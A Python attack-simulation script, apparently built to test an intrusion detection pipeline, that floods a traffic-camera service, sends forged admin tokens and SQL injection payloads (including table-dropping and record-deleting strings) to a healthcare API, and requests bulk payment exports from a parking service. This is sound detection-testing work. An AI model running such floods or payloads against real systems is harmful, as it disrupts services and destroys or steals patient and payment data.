#!/usr/bin/env python3
"""
Smart City IDS Attack Simulator Suite

Generates realistic attacks against Smart City IoT services:
- Traffic Camera Service (DDoS, parameter injection)
- Healthcare API Service (privilege escalation, SQL injection)
- Parking System Service (data exfiltration, unauthorized access)

Each attack generates alerts via Falco (runtime) + Suricata (network).
Designed to test end-to-end detection + analysis + response pipeline.

Usage:
    python phase4-smart-city-attacks.py --service traffic-camera --attack ddos
    python phase4-smart-city-attacks.py --service healthcare-api --attack privesc
    python phase4-smart-city-attacks.py --all --duration 60
"""

import argparse
import asyncio
import json
import logging
import sys
import time
from datetime import datetime
from typing import List, Dict, Any

import httpx

# Logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# ============================================================================
# Configuration
# ============================================================================

# Smart City Services (from k8s-manifests/services-no-build.yaml)
SERVICES = {
    "traffic-camera": {
        "url": "http://traffic-camera:5000",
        "description": "Traffic surveillance & vehicle detection",
        "endpoints": ["/api/stream", "/api/detection", "/api/analyze"]
    },
    "healthcare-api": {
        "url": "http://healthcare-api:5000",
        "description": "Patient records & medical imaging",
        "endpoints": ["/api/patients", "/api/images", "/api/records"]
    },
    "parking-system": {
        "url": "http://parking-system:5000",
        "description": "Parking space management & billing",
        "endpoints": ["/api/spaces", "/api/reservations", "/api/payments"]
    }
}

IDS_API_URL = "http://ids-api:8000/api/alerts"
IDS_API_TOKEN = "attack-simulator-token"

# ============================================================================
# Attack Definitions
# ============================================================================

class SmartCityAttack:
    """Base class for Smart City attacks"""
    
    def __init__(self, service: str, duration: int = 30):
        self.service = service
        self.duration = duration
        self.start_time = datetime.now()
        self.request_count = 0
        
    async def execute(self):
        """Run the attack"""
        raise NotImplementedError
    
    async def send_request(self, method: str, endpoint: str, payload: Dict[str, Any] = None):
        """Send HTTP request to service"""
        url = SERVICES[self.service]["url"] + endpoint
        try:
            async with httpx.AsyncClient(timeout=5.0) as client:
                if method.upper() == "GET":
                    response = await client.get(url, params=payload)
                elif method.upper() == "POST":
                    response = await client.post(url, json=payload)
                else:
                    response = await client.request(method, url)
                
                self.request_count += 1
                logger.debug(f"{method} {url} → {response.status_code}")
                return response
        except Exception as e:
            logger.warning(f"Request failed: {e}")
            return None
    
    def get_elapsed(self) -> int:
        """Get elapsed time in seconds"""
        return int((datetime.now() - self.start_time).total_seconds())


class DDoSAttack(SmartCityAttack):
    """
    DDoS Attack: Flood service with requests
    
    Targets: Traffic Camera Service
    Pattern: HTTP GET requests to /api/stream endpoint
    Rate: 100+ req/sec
    Detection: Suricata detects unusual traffic volume
    """
    
    async def execute(self):
        logger.info(f"🔴 DDoS ATTACK: Flooding {self.service}")
        logger.info(f"   Target: {SERVICES[self.service]['url']}")
        logger.info(f"   Rate: 100 req/sec for {self.duration}s")
        
        endpoint = SERVICES[self.service]["endpoints"][0]
        start = time.time()
        
        while self.get_elapsed() < self.duration:
            # Send multiple concurrent requests
            tasks = [
                self.send_request("GET", endpoint, {"frame_id": self.request_count + i})
                for i in range(50)
            ]
            
            await asyncio.gather(*tasks, return_exceptions=True)
            
            if self.get_elapsed() % 10 == 0:
                logger.info(f"   {self.request_count} requests sent ({self.get_elapsed()}s)")
            
            await asyncio.sleep(0.5)  # Slight delay between batches
        
        logger.info(f"✅ DDoS ATTACK COMPLETE: {self.request_count} requests in {self.get_elapsed()}s")


class PrivilegeEscalationAttack(SmartCityAttack):
    """
    Privilege Escalation Attack: Attempt unauthorized admin access
    
    Targets: Healthcare API Service
    Pattern: Request patient records with forged authorization
    Detection: Falco detects unauthorized file/process access
    Alert: "Unauthorized access to sensitive health records"
    """
    
    async def execute(self):
        logger.info(f"🔴 PRIVILEGE ESCALATION ATTACK: {self.service}")
        logger.info(f"   Target: {SERVICES[self.service]['url']}/api/patients")
        logger.info(f"   Method: Request private records with forged token")
        
        endpoint = SERVICES[self.service]["endpoints"][0]
        
        while self.get_elapsed() < self.duration:
            # Try to access restricted endpoints with forged authorization
            payload = {
                "patient_id": "ADMIN",
                "action": "list_all",
                "force_auth": "true",
                "authorization": f"Bearer fake-admin-token-{self.request_count}"
            }
            
            try:
                async with httpx.AsyncClient(timeout=5.0) as client:
                    response = await client.post(
                        SERVICES[self.service]["url"] + endpoint,
                        json=payload,
                        headers={"X-Forwarded-User": "root", "X-Force-Sudo": "true"}
                    )
                    self.request_count += 1
                    
                    if self.get_elapsed() % 5 == 0:
                        logger.info(f"   Attempt #{self.request_count} ({self.get_elapsed()}s)")
            except Exception as e:
                logger.debug(f"Request failed: {e}")
            
            await asyncio.sleep(1)
        
        logger.info(f"✅ PRIVILEGE ESCALATION COMPLETE: {self.request_count} attempts")


class SQLInjectionAttack(SmartCityAttack):
    """
    SQL Injection Attack: Attempt database compromise
    
    Targets: Healthcare API Service  
    Pattern: Inject SQL into patient_id and search parameters
    Detection: Suricata detects SQL injection patterns
    Alert: "Possible SQL Injection Attack"
    """
    
    async def execute(self):
        logger.info(f"🔴 SQL INJECTION ATTACK: {self.service}")
        logger.info(f"   Target: {SERVICES[self.service]['url']}")
        logger.info(f"   Method: SQL injection in query parameters")
        
        sql_payloads = [
            "1' OR '1'='1",
            "admin'; DROP TABLE patients; --",
            "1' UNION SELECT * FROM users --",
            "' OR 1=1 --",
            "1'; DELETE FROM records WHERE '1'='1",
        ]
        
        endpoint = SERVICES[self.service]["endpoints"][0]
        
        while self.get_elapsed() < self.duration:
            for sql_payload in sql_payloads:
                payload = {
                    "patient_id": sql_payload,
                    "search": sql_payload,
                    "query": f"SELECT * FROM patients WHERE id={sql_payload}"
                }
                
                try:
                    async with httpx.AsyncClient(timeout=5.0) as client:
                        response = await client.post(
                            SERVICES[self.service]["url"] + endpoint,
                            json=payload
                        )
                        self.request_count += 1
                except:
                    pass
                
                if self.get_elapsed() >= self.duration:
                    break
                
                await asyncio.sleep(0.5)
            
            if self.get_elapsed() % 10 == 0:
                logger.info(f"   {self.request_count} payloads sent ({self.get_elapsed()}s)")
        
        logger.info(f"✅ SQL INJECTION COMPLETE: {self.request_count} payloads")


class DataExfiltrationAttack(SmartCityAttack):
    """
    Data Exfiltration Attack: Extract sensitive data
    
    Targets: Parking System Service
    Pattern: Download large payment records, user data
    Detection: Falco detects file read operations on sensitive data
    Alert: "Suspicious data access pattern detected"
    """
    
    async def execute(self):
        logger.info(f"🔴 DATA EXFILTRATION ATTACK: {self.service}")
        logger.info(f"   Target: {SERVICES[self.service]['url']}")
        logger.info(f"   Method: Download all payment records")
        
        endpoint = SERVICES[self.service]["endpoints"][2]  # /api/payments
        
        while self.get_elapsed() < self.duration:
            # Request to download all payment data
            payload = {
                "action": "export_all",
                "format": "csv",
                "include_sensitive": "true",
                "user_id": "SYSTEM"
            }
            
            try:
                async with httpx.AsyncClient(timeout=10.0) as client:
                    response = await client.get(
                        SERVICES[self.service]["url"] + endpoint,
                        params=payload,
                        headers={
                            "Authorization": "Bearer extracted-token",
                            "X-Admin-Access": "true"
                        }
                    )
                    self.request_count += 1
                    
                    # Simulate large file download
                    if response.text:
                        logger.debug(f"Downloaded {len(response.text)} bytes")
            except Exception as e:
                logger.debug(f"Request failed: {e}")
            
            if self.get_elapsed() % 5 == 0:
                logger.info(f"   Exfiltration attempt #{self.request_count} ({self.get_elapsed()}s)")
            
            await asyncio.sleep(2)
        
        logger.info(f"✅ DATA EXFILTRATION COMPLETE: {self.request_count} requests")


class UnauthorizedAccessAttack(SmartCityAttack):
    """
    Unauthorized Access: Try to access all services without auth
    
    Targets: All services
    Pattern: Request endpoints without proper authentication
    Detection: Falco detects failed auth attempts, Suricata detects patterns
    Alert: "Multiple failed authentication attempts"
    """
    
    async def execute(self):
        logger.info(f"🔴 UNAUTHORIZED ACCESS ATTACK: {self.service}")
        
        endpoints = SERVICES[self.service]["endpoints"]
        
        while self.get_elapsed() < self.duration:
            for endpoint in endpoints:
                # Try without auth, with wrong auth, with no headers
                auth_headers = [
                    {},  # No auth
                    {"Authorization": "Bearer invalid-token"},
                    {"Authorization": "Basic invalid-credentials"},
                    {"X-API-Key": "wrong-key"},
                ]
                
                for headers in auth_headers:
                    try:
                        async with httpx.AsyncClient(timeout=5.0) as client:
                            response = await client.get(
                                SERVICES[self.service]["url"] + endpoint,
                                headers=headers
                            )
                            self.request_count += 1
                    except:
                        pass
                
                if self.get_elapsed() >= self.duration:
                    break
                
                await asyncio.sleep(0.5)
            
            if self.get_elapsed() % 10 == 0:
                logger.info(f"   {self.request_count} auth failures ({self.get_elapsed()}s)")
        
        logger.info(f"✅ UNAUTHORIZED ACCESS COMPLETE: {self.request_count} attempts")


# ============================================================================
# Attack Registry
# ============================================================================

ATTACKS = {
    "ddos": {
        "class": DDoSAttack,
        "description": "DDoS flood attack on traffic-camera service",
        "services": ["traffic-camera"],
        "severity": "Critical"
    },
    "privesc": {
        "class": PrivilegeEscalationAttack,
        "description": "Privilege escalation on healthcare-api",
        "services": ["healthcare-api"],
        "severity": "Critical"
    },
    "sqli": {
        "class": SQLInjectionAttack,
        "description": "SQL injection attack on healthcare database",
        "services": ["healthcare-api"],
        "severity": "Critical"
    },
    "exfil": {
        "class": DataExfiltrationAttack,
        "description": "Data exfiltration from parking system",
        "services": ["parking-system"],
        "severity": "Critical"
    },
    "unauth": {
        "class": UnauthorizedAccessAttack,
        "description": "Unauthorized access attempts",
        "services": ["traffic-camera", "healthcare-api", "parking-system"],
        "severity": "High"
    }
}


# ============================================================================
# Main Execution
# ============================================================================

async def run_attack(service: str, attack_type: str, duration: int = 30):
    """Execute a single attack"""
    if attack_type not in ATTACKS:
        logger.error(f"Unknown attack type: {attack_type}")
        logger.error(f"Available: {', '.join(ATTACKS.keys())}")
        return False
    
    attack_def = ATTACKS[attack_type]
    if service not in attack_def["services"]:
        logger.error(f"Attack '{attack_type}' not compatible with service '{service}'")
        logger.error(f"Compatible services: {attack_def['services']}")
        return False
    
    attack = attack_def["class"](service, duration)
    await attack.execute()
    return True


async def run_all_attacks(duration: int = 30):
    """Run all attacks sequentially"""
    logger.info("\n" + "=" * 75)
    logger.info("🔴 SMART CITY IDS - FULL ATTACK SCENARIO")
    logger.info("=" * 75 + "\n")
    
    attack_sequence = [
        ("traffic-camera", "ddos", duration),
        ("healthcare-api", "sqli", duration),
        ("healthcare-api", "privesc", duration),
        ("parking-system", "exfil", duration),
    ]
    
    for service, attack_type, attack_duration in attack_sequence:
        logger.info(f"\n[{attack_sequence.index((service, attack_type, attack_duration)) + 1}/{len(attack_sequence)}]")
        await run_attack(service, attack_type, attack_duration)
        logger.info("")
        await asyncio.sleep(2)  # Pause between attacks
    
    logger.info("\n" + "=" * 75)
    logger.info("✅ ALL ATTACKS COMPLETE")
    logger.info("=" * 75)


async def interactive_demo():
    """Interactive attack selection"""
    logger.info("\n" + "=" * 75)
    logger.info("🛡️  SMART CITY IDS - INTERACTIVE ATTACK DEMO")
    logger.info("=" * 75 + "\n")
    
    logger.info("Available Attacks:")
    for i, (attack_name, attack_def) in enumerate(ATTACKS.items(), 1):
        logger.info(f"{i}. {attack_name.upper()}")
        logger.info(f"   {attack_def['description']}")
        logger.info(f"   Services: {', '.join(attack_def['services'])}")
        logger.info(f"   Severity: {attack_def['severity']}\n")
    
    logger.info("Services:")
    for i, (service_name, service_def) in enumerate(SERVICES.items(), 1):
        logger.info(f"{i}. {service_name.upper()}")
        logger.info(f"   {service_def['description']}\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Smart City IDS Attack Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # DDoS attack on traffic camera (30s)
  python phase4-smart-city-attacks.py --service traffic-camera --attack ddos

  # Privilege escalation on healthcare API (60s)
  python phase4-smart-city-attacks.py --service healthcare-api --attack privesc --duration 60

  # Data exfiltration from parking system
  python phase4-smart-city-attacks.py --service parking-system --attack exfil

  # Run all attacks sequentially
  python phase4-smart-city-attacks.py --all

  # Interactive mode
  python phase4-smart-city-attacks.py --interactive
        """
    )
    
    parser.add_argument("--service", choices=list(SERVICES.keys()), help="Target service")
    parser.add_argument("--attack", choices=list(ATTACKS.keys()), help="Attack type")
    parser.add_argument("--duration", type=int, default=30, help="Attack duration in seconds (default: 30)")
    parser.add_argument("--all", action="store_true", help="Run all attacks sequentially")
    parser.add_argument("--interactive", action="store_true", help="Interactive mode")
    parser.add_argument("--verbose", action="store_true", help="Verbose logging")
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    try:
        if args.interactive:
            asyncio.run(interactive_demo())
        elif args.all:
            asyncio.run(run_all_attacks(args.duration))
        elif args.service and args.attack:
            success = asyncio.run(run_attack(args.service, args.attack, args.duration))
            sys.exit(0 if success else 1)
        else:
            parser.print_help()
            sys.exit(1)
    except KeyboardInterrupt:
        logger.info("\n❌ Attack interrupted by user")
        sys.exit(130)
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)
